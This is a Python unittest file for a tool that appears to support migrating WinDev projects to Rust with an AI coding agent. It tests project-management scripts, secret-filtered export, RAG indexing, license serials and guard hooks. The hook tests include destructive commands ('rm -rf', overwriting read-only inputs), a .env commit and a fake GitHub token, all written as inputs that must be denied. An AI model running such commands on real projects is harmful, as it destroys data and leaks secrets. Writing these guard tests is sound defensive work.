            self.assertIn("painel.html", r.stdout); self.assertTrue((tmp / ".wx-migration/pmo/painel.html").is_file()); self.assertTrue((tmp / ".wx-migration/pmo/relatorio.md").is_file())
            self.assertIn("Empresa e contrato", (tmp / ".wx-migration/pmo/painel.html").read_text())
            r = run(SCRIPTS / "pmo.py", "--project-root", tmp, "entregar", "--plugin-root", RAIZ)
            import zipfile
            z = zipfile.ZipFile(next((tmp / ".wx-migration/pmo/entregas").glob("*.zip")))
            nomes = z.namelist()
            self.assertTrue(any(n.endswith("/painel.html") for n in nomes)); self.assertTrue(any(n.endswith("/relatorio.md") for n in nomes))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_status_sem_numero_inventado(self):
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "status")
        self.assertIn("1/9 = 11.1%", r.stdout)
        self.assertIn("| G1 | 0 | 0 | — |", r.stdout)


class Golden(unittest.TestCase):
    def test_compara_com_tolerancia(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            run(SCRIPTS / "golden.py", "capturar", "--casos", EXEMPLO / "inputs/dados-de-amostra/resultados-esperados.json", "--saida", tmp / "g.json")
            res = {"resultados": [{"id": "TST-BR-001-a", "resultado": 249.382}, {"id": "TST-BR-004-b", "resultado": [33.33, 33.33, 33.34]}, {"id": "TST-BR-005-b", "resultado": True}]}
            (tmp / "r.json").write_text(json.dumps(res))
            r = run(SCRIPTS / "golden.py", "comparar", "--golden", tmp / "g.json", "--resultados", tmp / "r.json", "--relatorio", tmp / "c.json")
            self.assertEqual(r.returncode, 1)
            rel = json.loads((tmp / "c.json").read_text())
            por = {c["id"]: c["passou"] for c in rel["casos"]}
            self.assertTrue(por["TST-BR-001-a"]); self.assertTrue(por["TST-BR-004-b"]); self.assertFalse(por["TST-BR-005-b"])
            self.assertEqual(rel["equivalencia"], "2/10")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class ExtrairPdf(unittest.TestCase):
    def test_extrai_com_localizador(self):
        try:
            import pypdf  # noqa: F401
        except ImportError:
            self.skipTest("pypdf ausente")
        tmp = Path(tempfile.mkdtemp())
        try:
            shutil.copytree(EXEMPLO / "inputs", tmp / "inputs"); (tmp / ".wx-migration").mkdir()
            shutil.copy(EXEMPLO / "questionario.json", tmp / ".wx-migration/questionario.json")
            run(SCRIPTS / "aplicar_questionario.py", "--questionario", tmp / ".wx-migration/questionario.json", "--project-root", tmp, "--plugin-root", RAIZ)
            r = run(SCRIPTS / "extrair_pdf.py", "--manifest", tmp / ".wx-migration/wx-inputs.manifest.json", "--allowed-evidence-root", tmp / "inputs", "--output", tmp / ".wx-migration/evidence/pdf-text")
            self.assertEqual(r.returncode, 0, r.stderr)
            s = json.loads((tmp / ".wx-migration/evidence/pdf-text/sumario.json").read_text())
            self.assertEqual(len(s["arquivos"]), 4); self.assertEqual(s["ocr_required"], [])
            self.assertIn("CalculaDesconto", (tmp / ".wx-migration/evidence/pdf-text/estoque-codigo/0001.txt").read_text())
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class HookG0(unittest.TestCase):
    def hook(self, tmp: Path, arquivo: str):
        return run(RAIZ / "hooks/portao_g0.py", entrada=json.dumps({"tool_name": "Write", "tool_input": {"file_path": str(tmp / arquivo)}, "cwd": str(tmp)}))

    def test_nega_fora_do_wx_migration_quando_blocked(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            run_dir = tmp / ".wx-migration/preflight/runs/run-1"; run_dir.mkdir(parents=True)
            (run_dir / "report.json").write_text(json.dumps({"status": "BLOCKED", "summary": {"errors": 3}}))
            r = self.hook(tmp, "src/main.rs"); self.assertIn('"deny"', r.stdout)
            r = self.hook(tmp, ".wx-migration/gaps.md"); self.assertEqual(r.stdout, "")
            (run_dir / "report.json").write_text(json.dumps({"status": "READY"}))
            r = self.hook(tmp, "src/main.rs"); self.assertEqual(r.stdout, "")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)



class ExportarEZelador(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copytree(EXEMPLO / "inputs", self.tmp / "inputs"); (self.tmp / ".wx-migration").mkdir()
        shutil.copy(EXEMPLO / "questionario.json", self.tmp / ".wx-migration" / "questionario.json")
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_exporta_organizado_sem_segredos_e_com_hashes(self):
        cod = self.tmp / "estoque-rs"; (cod / "src").mkdir(parents=True); (cod / "target").mkdir()
        (cod / "src/main.rs").write_text("fn main(){}"); (cod / ".env").write_text("X=1"); (cod / "target/app").write_text("bin")
        (cod / "config.txt").write_text("T=ghp_abcdefghijklmnopqrstuvwxyz0123456789")
        saida = Path(tempfile.mkdtemp())
        r = run(SCRIPTS / "exportar_projeto.py", "--project-root", self.tmp, "--destino", saida, "--codigo", cod)
        self.assertEqual(r.returncode, 0, r.stderr); raiz = next(saida.iterdir())
        for pasta in ("01-questionario", "02-evidencias", "03-inventario-e-decisoes", "04-pmo", "05-ambiente-e-prompts", "06-codigo", "07-relatorio-final"):
            self.assertTrue((raiz / pasta).is_dir(), pasta)
        self.assertTrue((raiz / "06-codigo/src/main.rs").is_file()); self.assertFalse((raiz / "06-codigo/.env").exists()); self.assertFalse((raiz / "06-codigo/target").exists())
        self.assertFalse((raiz / "06-codigo/config.txt").exists())
        m = json.loads((raiz / "manifesto.json").read_text())
        self.assertEqual(m["recusados_por_segredo"], ["estoque-rs/config.txt"])
        um = next(x for x in m["arquivos"] if x["arquivo"].endswith("06-codigo/src/main.rs"))
        import hashlib; self.assertEqual(um["sha256"], hashlib.sha256(b"fn main(){}").hexdigest())
        self.assertTrue((raiz / "05-ambiente-e-prompts/ambiente/.env.exemplo").is_file())  # achado de sessao real: o regex de .env pegava o exemplo
        self.assertTrue((raiz / "02-evidencias/hashes.json").is_file()); self.assertFalse((raiz / "02-evidencias/banco.sql").exists())
        self.assertIn("| `06-codigo/` |", (raiz / "00-LEIA-ME.md").read_text())
        r = run(SCRIPTS / "exportar_projeto.py", "--project-root", self.tmp, "--destino", saida, "--codigo", cod)
        self.assertEqual(r.returncode, 2); self.assertIn("já existe", r.stderr)
        r = run(SCRIPTS / "exportar_projeto.py", "--project-root", self.tmp, "--destino", self.tmp / "dentro")
        self.assertEqual(r.returncode, 2); self.assertIn("dentro do projeto", r.stderr)
        shutil.rmtree(saida, ignore_errors=True)

    def test_zelador_limpa_so_temporarios_e_uma_vez_por_dia(self):
        import time
        runs = self.tmp / ".wx-migration/preflight/runs"
        for i in range(5):
            d = runs / f"run-{i}"; d.mkdir(parents=True); (d / "report.json").write_text("{}")
            os.utime(d, (time.time() - 30 * 86400, time.time() - 30 * 86400))
        logs = self.tmp / ".wx-migration/logs"; logs.mkdir(exist_ok=True)
        (logs / "velho.log").write_text("x"); os.utime(logs / "velho.log", (time.time() - 10 * 86400,) * 2)
        (logs / "novo.log").write_text("x")
        (self.tmp / "src").mkdir(exist_ok=True); (self.tmp / "src/__pycache__").mkdir(); (self.tmp / "src/__pycache__/a.pyc").write_text("x")
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "limpar")
        self.assertIn("só relatório", r.stdout); self.assertTrue((logs / "velho.log").exists())
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "limpar", "--executar")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertFalse((logs / "velho.log").exists()); self.assertTrue((logs / "novo.log").exists())
        self.assertEqual(sorted(p.name for p in runs.iterdir()), ["run-2", "run-3", "run-4"])
        self.assertFalse((self.tmp / "src/__pycache__").exists())
        self.assertTrue((self.tmp / "inputs/banco.sql").exists()); self.assertTrue((self.tmp / ".wx-migration/pmo/plano.json").exists())
        self.assertIn("| apagou |", (logs / "zelador.md").read_text())
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "limpar", "--se-vencido")
        self.assertIn("já rodou hoje", r.stdout)
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "hook-sessao"); self.assertEqual(r.stdout, "")


class EquipePrioritaria(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp()); (self.tmp / ".wx-migration").mkdir()
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar", "--aprovador", "A")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_infrutifero_aciona_pesquisador_e_base_em_dois_arquivos_com_indice(self):
        import re as _re
        pid = _re.search(r"PDCA-\d+", run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "abrir", "--gate", "G4", "--hipotese", "H1", "--medida", "ms", "--criterio", "<1").stdout).group(0)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", pid, "--resultado", "infrutifero", "--medido", "9", "--aprendizado", "x", "--proxima", "H2")
        self.assertIn("pedido ao Pesquisador", r.stdout)
        self.assertIn("| PDCA-001 | ", (self.tmp / ".wx-migration/pmo/pesquisas.md").read_text()); self.assertIn("| aberto |", (self.tmp / ".wx-migration/pmo/pesquisas.md").read_text())
        self.assertTrue((self.tmp / ".wx-migration/pmo/conhecimento/infrutiferos.md").is_file()); self.assertFalse((self.tmp / ".wx-migration/pmo/conhecimento/frutiferos.md").exists())
        idx = (self.tmp / ".wx-migration/pmo/conhecimento/indice.md").read_text(); self.assertIn("| `infrutiferos.md` |", idx); self.assertIn("| 1 |", idx)
        self.assertIn("para o GP", (self.tmp / ".wx-migration/pmo/avisos.md").read_text())
        pid2 = _re.search(r"PDCA-\d+", run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "abrir", "--gate", "G4", "--hipotese", "H2", "--medida", "ms", "--criterio", "<1").stdout).group(0)
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "pdca", "fechar", "--id", pid2, "--resultado", "frutifero", "--medido", "0.5", "--aprendizado", "ok")
        self.assertNotIn("Pesquisador", r.stdout); self.assertTrue((self.tmp / ".wx-migration/pmo/conhecimento/frutiferos.md").is_file())

    def test_status_por_agente_e_atividades(self):
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "atividade", "--agente", "papel-c-dba", "--item", "DB-1", "--estado", "bloqueado", "--nota", "sem banco")
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "atividade", "--agente", "equipe-g-testes", "--item", "BR-1", "--estado", "concluiu")
        r = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "atividade", "--agente", "x", "--item", "y", "--estado", "dormindo"); self.assertNotEqual(r.returncode, 0)
        st = run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "status", "--por-agente").stdout
        self.assertIn("| papel-c-dba | 1 | 0 | 1 | 0 | 0 |", st); self.assertIn("DB-1: bloqueado — sem banco", st)
        self.assertTrue((self.tmp / ".wx-migration/pmo/status-por-agente.md").is_file())

    def test_gestor_de_tarefas_pesa_e_escolhe_modelo(self):
        r = run(SCRIPTS / "pesar_tarefa.py", "--project-root", self.tmp, "pesar", "--id", "UI-1", "--titulo", "t"); self.assertIn("haiku", r.stdout); self.assertIn("[ESTIMADO]", r.stdout)
        r = run(SCRIPTS / "pesar_tarefa.py", "--project-root", self.tmp, "pesar", "--id", "BR-1", "--titulo", "t", "--sinal", "fiscal", "--sinal", "concorrencia", "--sinal", "seguranca", "--sinal", "banco", "--referencia", "doc: linhas=1200 horas=20")
        self.assertIn("critico", r.stdout); self.assertIn("opus effort max", r.stdout); self.assertIn("[MEDIDO]", r.stdout)
        r = run(SCRIPTS / "pesar_tarefa.py", "--project-root", self.tmp, "pesar", "--id", "X", "--titulo", "t", "--sinal", "magia"); self.assertEqual(r.returncode, 2)
        run(SCRIPTS / "pesar_tarefa.py", "--project-root", self.tmp, "registrar", "--id", "BR-1", "--linhas-reais", "900", "--horas-reais", "15")
        r = run(SCRIPTS / "pesar_tarefa.py", "--project-root", self.tmp, "pesar", "--id", "BR-2", "--titulo", "t"); self.assertIn("linhas 900", r.stdout)

    def test_documentador_gera_md_html_e_indice(self):
        cod = self.tmp / "src"; cod.mkdir()
        (cod / "a.py").write_text('def soma(a: int, b: int) -> int:\n    """Soma dois inteiros."""\n    return a + b\n\ndef sem_doc(x):\n    return x\n')
        (cod / "b.rs").write_text("/// Calcula o saldo do lote.\npub fn saldo(lote: &Lote) -> Decimal {\n    lote.entradas - lote.saidas\n}\n")
        (cod / "c.ts").write_text("/** Formata moeda. */\nexport function moeda(v: number): string { return v.toFixed(2) }\n")
        r = run(SCRIPTS / "documentar_codigo.py", "--codigo", cod, "--saida", self.tmp / "docs", "--projeto", "t"); self.assertEqual(r.returncode, 0, r.stderr)
        idx = json.loads((self.tmp / "docs/indice.json").read_text())
        por = {i["funcao"]: i for i in idx["indice"]}
        self.assertEqual(por["soma"]["finalidade"], "Soma dois inteiros."); self.assertEqual(por["soma"]["parametros"], ["a: int", "b: int"]); self.assertEqual(por["soma"]["retorno"], "int")
        self.assertEqual(por["saldo"]["finalidade"], "Calcula o saldo do lote."); self.assertEqual(por["moeda"]["finalidade"], "Formata moeda."); self.assertEqual(por["sem_doc"]["finalidade"], "(nao documentado)")
        self.assertEqual(idx["sem_finalidade"], 1); self.assertIn("<table>", (self.tmp / "docs/funcoes.html").read_text()); self.assertIn("### `soma`", (self.tmp / "docs/funcoes.md").read_text())

    def test_tradutor_centraliza_e_verifica(self):
        run(SCRIPTS / "i18n.py", "--project-root", self.tmp, "iniciar", "--idioma", "pt-BR", "--idioma", "en")
        run(SCRIPTS / "i18n.py", "--project-root", self.tmp, "adicionar", "--chave", "botao.gravar", "--texto", "pt-BR=Gravar")
        self.assertEqual(run(SCRIPTS / "i18n.py", "--project-root", self.tmp, "verificar").returncode, 3)
        run(SCRIPTS / "i18n.py", "--project-root", self.tmp, "adicionar", "--chave", "botao.gravar", "--texto", "en=Save")
        self.assertEqual(run(SCRIPTS / "i18n.py", "--project-root", self.tmp, "verificar").returncode, 0)
        cod = self.tmp / "web"; cod.mkdir(); (cod / "Tela.tsx").write_text('<button title="Confirma a exclusão?">x</button>')
        r = run(SCRIPTS / "i18n.py", "--project-root", self.tmp, "extrair", "--codigo", cod); self.assertIn("1 literal", r.stdout)
        d = json.loads((self.tmp / "i18n/textos.json").read_text()); self.assertTrue(any(k.startswith("pendente.") for k in d["textos"]))

    def test_zelador_por_sinal_de_espaco(self):
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "espaco", "--minimo-mb", "1"); self.assertIn("nada a fazer", r.stdout)
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "espaco", "--minimo-mb", "999999999", "--executar"); self.assertIn("abaixo de", r.stdout); self.assertIn("agora", r.stdout)


class HooksERag(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copytree(EXEMPLO / "inputs", self.tmp / "inputs"); (self.tmp / ".wx-migration").mkdir()
        shutil.copy(EXEMPLO / "questionario.json", self.tmp / ".wx-migration" / "questionario.json")
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def guarda(self, tool, ti):
        return run(RAIZ / "hooks/guarda_anexos_e_segredos.py", entrada=json.dumps({"tool_name": tool, "tool_input": ti, "cwd": str(self.tmp)})).stdout

    def test_guarda_anexos_somente_leitura_e_segredos(self):
        self.assertIn('"deny"', self.guarda("Write", {"file_path": "inputs/banco.sql", "content": "x"}))
        self.assertIn('"deny"', self.guarda("Edit", {"file_path": str(self.tmp / "inputs/screenshots/x.png"), "new_string": "x"}))
        self.assertIn('"deny"', self.guarda("Bash", {"command": "rm -rf inputs/screenshots"}))
        self.assertIn('"deny"', self.guarda("Bash", {"command": "echo x > inputs/banco.sql"}))
        self.assertIn('"deny"', self.guarda("Write", {"file_path": "src/a.rs", "content": "ghp_abcdefghijklmnopqrstuvwxyz0123456789"}))
        self.assertIn('"deny"', self.guarda("Write", {"file_path": ".env", "content": "X=1"}))
        self.assertIn('"deny"', self.guarda("Bash", {"command": "git add .env && git commit -m x"}))
        self.assertEqual(self.guarda("Write", {"file_path": ".env.exemplo", "content": "X="}), "")
        self.assertEqual(self.guarda("Write", {"file_path": "src/main.rs", "content": "fn main(){}"}), "")
        self.assertEqual(self.guarda("Bash", {"command": "cat inputs/banco.sql | head"}), "")
        self.assertEqual(self.guarda("Bash", {"command": "cargo test"}), "")
        outro = Path(tempfile.mkdtemp())  # projeto sem .wx-migration nao e afetado
        r = run(RAIZ / "hooks/guarda_anexos_e_segredos.py", entrada=json.dumps({"tool_name": "Write", "tool_input": {"file_path": "inputs/x", "content": "x"}, "cwd": str(outro)}))
        self.assertEqual(r.stdout, ""); shutil.rmtree(outro, ignore_errors=True)

    def test_sincronizar_pmo_regera_kanban_e_marca_rag(self):
        r = run(RAIZ / "hooks/sincronizar_pmo.py", entrada=json.dumps({"tool_name": "Edit", "tool_input": {"file_path": str(self.tmp / ".wx-migration/traceability.csv")}, "cwd": str(self.tmp)}))
        self.assertIn("kanban.md regerado", r.stdout); self.assertTrue((self.tmp / ".wx-migration/pmo/kanban.md").is_file())
        self.assertTrue((self.tmp / ".wx-migration/rag/indice.json.desatualizado").is_file())
        r = run(RAIZ / "hooks/sincronizar_pmo.py", entrada=json.dumps({"tool_name": "Edit", "tool_input": {"file_path": str(self.tmp / "src/x.rs")}, "cwd": str(self.tmp)})); self.assertEqual(r.stdout, "")

    def test_rag_reconhece_simbolo_wlanguage_e_aponta_o_tema(self):
        r = run(SCRIPTS / "rag.py", "--project-root", self.tmp, "indexar-corpus"); self.assertIn("CREATED corpus-simbolos.json", r.stdout)
        m = json.loads((self.tmp / ".wx-migration/rag/corpus-simbolos.json").read_text())["simbolos"]
        self.assertIn("hreadseekfirst", m); self.assertIn("01-03-03", m["hreadseekfirst"]["grupos"])
        r = subprocess.run([sys.executable, str(SCRIPTS / "rag.py"), "--project-root", str(self.tmp), "hook"], input=json.dumps({"prompt": "Como converter HReadSeekFirst e fFileExist para Rust?"}), capture_output=True, text=True)
        self.assertIn("--group 01-03-03 --query hreadseekfirst", r.stdout); self.assertIn("ffileexist", r.stdout)
        r = subprocess.run([sys.executable, str(SCRIPTS / "rag.py"), "--project-root", str(self.tmp), "hook"], input=json.dumps({"prompt": "Qual é o prazo final do projeto?"}), capture_output=True, text=True)
        self.assertNotIn("Help WLanguage", r.stdout)

    def test_rag_indexa_busca_com_localizador_e_hook_injeta(self):
        r = run(SCRIPTS / "rag.py", "--project-root", self.tmp, "--plugin-root", RAIZ, "indexar"); self.assertEqual(r.returncode, 0, r.stderr); self.assertIn("trechos", r.stdout)
        r = run(SCRIPTS / "rag.py", "--project-root", self.tmp, "--plugin-root", RAIZ, "buscar", "prazo final de entrega", "--json")
        res = json.loads(r.stdout); self.assertTrue(res); self.assertTrue(any("cronograma.md" in x["arquivo"] for x in res[:3])); self.assertTrue(all(x["linha"] >= 1 for x in res))
        r = run(SCRIPTS / "rag.py", "--plugin-root", RAIZ, "hook", entrada=json.dumps({"prompt": "Qual é a estratégia de conversão do backend?"}), cwd=self.tmp)
        self.assertIn("RAG do projeto", r.stdout); self.assertIn("#L", r.stdout)
        r = run(SCRIPTS / "rag.py", "--plugin-root", RAIZ, "hook", entrada=json.dumps({"prompt": "/wx-claude-code:pmo status"}), cwd=self.tmp); self.assertEqual(r.stdout, "")
        (self.tmp / ".wx-migration/rag/indice.json.desatualizado").write_text("x")
        run(SCRIPTS / "rag.py", "--plugin-root", RAIZ, "hook", entrada=json.dumps({"prompt": "quem aprova os gates deste projeto"}), cwd=self.tmp)
        self.assertFalse((self.tmp / ".wx-migration/rag/indice.json.desatualizado").exists())
        self.assertNotIn("questionario.json", json.dumps([d["arquivo"] for d in json.loads((self.tmp / ".wx-migration/rag/indice.json").read_text())["docs"]]))


class Licenca(unittest.TestCase):
    """Serial RSA: o plugin so tem a chave publica e nao forja serial."""

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, str(SCRIPTS))
        import licenca
        cls.lic = licenca
        cls.priv, cls.pub = licenca.gerar_chaves()

    def test_serial_valido_alterado_vencido_e_de_outra_maquina(self):
        from datetime import date
        L = self.lic
        s = L.gerar_serial("Softhouse X", "2099-01-01", self.priv)
        self.assertEqual(L.verificar_serial(s, self.pub)["status"], "valida")
        self.assertEqual(L.verificar_serial(s[:-2] + ("A" if s[-2] != "A" else "B") + s[-1], self.pub)["status"], "assinatura-invalida")
        payload_alterado = s.split(".")[1][:-1] + ("A" if s.split(".")[1][-1] != "A" else "B")
        self.assertNotEqual(L.verificar_serial(".".join([s.split(".")[0], payload_alterado, s.split(".")[2]]), self.pub)["status"], "valida")
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2000-01-01", self.priv), self.pub)["status"], "vencida")
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2099-01-01", self.priv, maquina="0000000000000000"), self.pub)["status"], "maquina-diferente")
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2099-01-01", self.priv, maquina=L.impressao_da_maquina()), self.pub)["status"], "valida")
        outra_priv, _ = L.gerar_chaves()
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2099-01-01", outra_priv), self.pub)["status"], "assinatura-invalida")

    def test_hook_nega_scripts_do_plugin_sem_licenca_e_libera_com(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            (tmp / "chave-publica.json").write_text(json.dumps(self.pub))
            env = dict(os.environ, WX_LICENCA=str(tmp / "licenca"))
            def hook(entrada):
                return subprocess.run([sys.executable, "-c", f"import sys; sys.path.insert(0, {str(SCRIPTS)!r}); import licenca; from pathlib import Path; licenca.CHAVE_PUBLICA = Path({str(tmp / 'chave-publica.json')!r}); sys.exit(licenca.hook_pre_tool())"], input=json.dumps(entrada), capture_output=True, text=True, env=env).stdout
            plugin = {"tool_name": "Bash", "tool_input": {"command": "python3 x/skills/conversao-wx/scripts/pmo.py status"}}
            self.assertIn('"deny"', hook(plugin))
            self.assertIn('"deny"', hook({"tool_name": "Write", "tool_input": {"file_path": "/p/.wx-migration/gaps.md"}}))
            self.assertEqual(hook({"tool_name": "Bash", "tool_input": {"command": "cargo test"}}), "")
            self.assertEqual(hook({"tool_name": "Write", "tool_input": {"file_path": "/p/src/main.rs"}}), "")
            (tmp / "licenca").write_text(self.lic.gerar_serial("Softhouse X", "2099-01-01", self.priv))
            self.assertEqual(hook(plugin), "")
            (tmp / "licenca").write_text(self.lic.gerar_serial("Softhouse X", "2000-01-01", self.priv))
            self.assertIn("vencida", hook(plugin))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    unittest.main(verbosity=1)
